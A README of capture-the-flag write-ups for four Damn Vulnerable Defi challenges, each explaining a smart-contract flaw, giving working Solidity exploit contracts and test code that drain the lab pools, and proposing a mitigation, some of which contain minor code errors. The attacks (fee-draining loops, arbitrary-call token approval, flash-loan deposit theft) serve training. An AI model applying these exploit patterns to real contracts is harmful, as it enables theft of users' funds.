# DamnVulnerableDefi-Solutions
My writeups for the Damn Vulnerable Defi challenges

## Challenge #1 - Unstoppable

There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.

To pass the challenge, make the vault stop offering flash loans.

You start with 10 DVT tokens in balance.

### `UnstoppableVault.sol`: Transferring asset tokens directly to the vault results in the contract denial of service

Function `flashLoan` compares it's asset tokens balance with a result of converting all available shares into asset tokens 
```
    function totalAssets() public view override returns (uint256) {
        assembly { // better safe than sorry
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return asset.balanceOf(address(this));
    }
```

```
uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```
with the goal of making sure that at the moment of function execution there are no discrepancies in an accounting

This strict check gives us an opportunity to disrupt contract functionality with a direct transfer of the asset tokens to the vault which leads to an increase of it's balance and the discrepancy that we discussed above.

### Proof of concept

Paste the following block of code in the `unstoppable.challenge.js`

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        await token.connect(player).transfer(vault.address, 100);
    });

```

### Mitigation

We need to make sure that we use only asset tokens that we receive from the user's deposits in an accounting, thus we need to modify the contract as follows

1. Create new storage variable `uint256 _assetBalance`
2. Modify it inside deposit function
```
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual {
        SafeERC20.safeTransferFrom(_asset, caller, address(this), assets);
        _assetBalance += assets;
        _mint(receiver, shares);

        emit Deposit(caller, receiver, assets, shares);
    }
```
3. Rewrite `totalAssets`
```
    function totalAssets() public view override returns (uint256) {
        assembly { // better safe than sorry
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return _assetBalance;
    }
```

## Challenge #2 - Naive receiver

There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.

A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.

Take all ETH out of the user’s contract. If possible, in a single transaction.

### `NaiveReceiverLenderPool.sol`: Anyone can call `flashLoan` function causing unsuspecting borrowers to lose their tokens

`flashLoan` is a permitionless function that exetutes a flash loan while simultaneously taking 1 ETH fee from the borrower. Hacker can call this function with any contract address, that implemented `onFlashLoan` function, and a zero `amount` loan causing the borrower to pay the fees and draining it's balance.

### Proof of concept

Here is the simple contract which can drain any borrower's balance

```
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract NaiveExploit {
    IERC3156FlashLender public immutable pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor (IERC3156FlashLender _pool) {
        pool = _pool;
    }

    function attack(IERC3156FlashBorrower target) public {
          while(address(target).balance > 0) {
              pool.flashLoan(target, ETH, 0, "0x");
          }
    }
}
```

Deploy and call `attack` function inside `naive-receiver.challenge.js`

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('NaiveExploit');
        exploit = await Exploit.deploy(pool.address);

        await exploit.connect(player).attack(receiver.address);
    });
```

### Mitigation

Allow only borrower contract to call `flashLoan` function

```
 function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
    if (msg.sender != address(receiver) revert NotABorrower();
    ...
```

## Challenge #3 - Truster
More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

### `TrusterLenderPool.sol`: `flashLoan` function allows executing any malicious code via target.functionCall()

Hackers can execute any code with pool addres as a `msg.sender`, we can call `flashLoan` function with DVT token address as a `target` and encoded `approve` function payload as a `data`, thus we can approve all DVT in pool's posession to be spended by anyone.

### Proof of concept

Attaker's contract

```
// SPDX-License-Identifier: MIT

import "../truster/TrusterLenderPool.sol";

pragma solidity ^0.8.0;

contract TrusterExploit {
    TrusterLenderPool public immutable pool;
    ERC20 public immutable token;
    bytes private evilData = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max); 

    constructor (TrusterLenderPool _pool, ERC20 _token) {
        pool = _pool;
        token = _token;
    }

    function attack() public {
        uint256 bal = token.balanceOf(address(pool));
        pool.flashLoan(0, address(this), address(token), evilData);
        token.transferFrom(address(pool), msg.sender, bal); 
    }
}
```

Paste the following inside a `truster.challenge.js`

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('TrusterExploit');
        exploit = await Exploit.deploy(pool.address, token.address);

        await exploit.connect(player).attack();
    });
```

This will trnasfer all DVT from pool to the player address

### Mitigation

Allow only trusted payload to be sent by the pool contract, remove `data` parameter from the `flashLoan` function 

```
 function flashLoan(uint256 amount, address borrower, address target)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));
        bytes memory trustedPayload = abi.encodeWithSignature("onFlashLoan(address, address, uint256)", borrower, address(token), amount);

        token.transfer(borrower, amount);
        target.functionCall(trustedPayload);
        ...
```

## Challenge #4 - Side Entrance
A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.

It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

### `SideEntranceLenderPool.sol`: pool ETH accounting allows loaning ETH and depositing it inside a pool in the same `flashLoan` transaction leading to a loss of funds from the pool

Hackers can call pool `deposit` function and deposit loaned ETH effectively stealing it from the pool without contract noticing it, `address(this).balance` check will return `true` which means `flasLoan` won't revert. But because `msg.value` in `deposit` call is added to `msg.sender` balance ownership of the funds is transfered from the pool to the malicious borrower contract.

### Proof of concept

Malicious borrower, notice `deposit` call inside `execute` funtion

```
// SPDX-License-Identifier: MIT

import "../side-entrance/SideEntranceLenderPool.sol";

pragma solidity ^0.8.0;

contract SideExploit {
    SideEntranceLenderPool public immutable pool;

    constructor (SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function attack() public {
        pool.flashLoan(address(pool).balance);

        pool.withdraw();
        msg.sender.call{value: address(this).balance}("");
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

Hack inside `side-entrance.challenge.js`

```
    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const Exploit = await ethers.getContractFactory('SideExploit');
        exploit = await Exploit.deploy(pool.address);

        await exploit.connect(player).attack();
    });
```

### Mitigation

Use reentrancy modifiers to restrict a `deposit` call from the `flashLoan` function
